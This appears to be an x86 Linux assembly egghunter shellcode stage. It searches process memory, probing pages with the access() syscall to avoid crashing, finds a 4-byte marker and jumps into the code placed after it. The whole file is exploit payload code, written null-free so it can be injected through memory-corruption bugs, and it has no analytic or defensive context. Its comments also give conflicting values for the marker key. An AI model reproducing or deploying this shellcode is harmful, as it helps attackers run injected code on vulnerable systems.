global _start
section .text
_start:
        xor ecx, ecx            ; zero out ecx
        mul ecx			; zero out eax, edx 
        cld			; Clear the direction flag
align_page:
        or dx,0xfff		; initial page size is set to 4095 and then edx is incremented by 1 to obtain 4096 (0x1000) to avoid nulls
iter_addr:
        inc edx
        lea ebx, [edx+0x4]      ; load page into ebx
        push byte 0x21		; syscall access()
        pop eax
        int 0x80
        cmp al, 0xf2		; check for EFAULT
        jz align_page           ; if zflag = 0 (EFAULT is returned), we need to skip this block (+0x1000 bytes)
        mov eax,0x90509051     ; mov egg key into eax
	dec eax		       ; key[] = 0x90509050
	mov edi, edx
        scasd                   ; scasd will compare the contents stored in edi with eax (0x50905090)
	jnz iter_addr           ; if the key is not found jump to the next address and compare
        jmp edi
